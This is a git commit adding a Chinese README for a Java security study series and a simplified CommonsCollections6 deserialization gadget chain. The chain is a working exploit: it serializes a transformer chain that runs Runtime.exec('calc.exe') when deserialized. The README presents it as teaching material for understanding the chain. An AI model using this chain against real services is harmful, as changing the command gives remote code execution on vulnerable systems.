c9fa885b965ff064867d2cdbbfc5beee72073adc
phith0n <phith0n.ph2f@gmail.com>
2020-07-21 00:07:30 +0800

    initial code and description

---
+++ README.md
@@ -0,0 +1,21 @@
+# JavaThings - Java安全漫谈笔记相关
+
+《Java安全漫谈》是我在写的一点Java学习相关的随笔，不是很严谨，也不是啥高科技。这个Repository主要是记录并整理一下，附加一些代码。
+
+## Java安全漫谈目录
+
+- [Java安全漫谈 - 01.反射篇(1)](https://t.zsxq.com/iyJiAMJ)
+- [Java安全漫谈 - 02.反射篇(2)](https://t.zsxq.com/iIa2B2j)
+- [Java安全漫谈 - 03.反射篇(3)](https://t.zsxq.com/MNRbayr)
+- [Java安全漫谈 - 04.RMI篇(1)](https://t.zsxq.com/FMJiUrV)
+- [Java安全漫谈 - 05.RMI篇(2)](https://t.zsxq.com/BuFy3zF)
+- [Java安全漫谈 - 06.RMI篇(3)](https://t.zsxq.com/vZjaiuR)
+- [Java安全漫谈 - 07.反序列化篇(1)](https://t.zsxq.com/NF2NfQf)
+- [Java安全漫谈 - 08.反序列化篇(2)](https://t.zsxq.com/ieMZBQj)
+- [Java安全漫谈 - 09.反序列化篇(3)](https://t.zsxq.com/BmIIAy3)
+- [Java安全漫谈 - 10.反序列化篇(4)](https://t.zsxq.com/ZNZrJMZ)
+- [Java安全漫谈 - 11.反序列化篇(5)](https://t.zsxq.com/FufUf2B)
+
+## Demo代码
+
+- 我简化的[CommonCollections6](deserialization/src/java/com/govuln/CommonsCollections6.java)，更方便大家理解
---
+++ deserialization/src/main/java/com/govuln/CommonsCollections6.java
@@ -0,0 +1,58 @@
+package com.govuln;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonsCollections6 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] { String.class,
+                        Class[].class }, new Object[] { "getRuntime",
+                        new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] { Object.class,
+                        Object[].class }, new Object[] { null, new Object[0] }),
+                new InvokerTransformer("exec", new Class[] { String.class },
+                        new String[] { "calc.exe" }),
+                new ConstantTransformer(1),
+        };
+        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+
+        // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
+
+        Map expMap = new HashMap();
+        expMap.put(tme, "valuevalue");
+
+        outerMap.remove("keykey");
+
+        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
+        f.setAccessible(true);
+        f.set(transformerChain, transformers);
+
+        // ==================
+        // 生成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(expMap);
+        oos.close();
+
+        // 本地测试触发
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+}
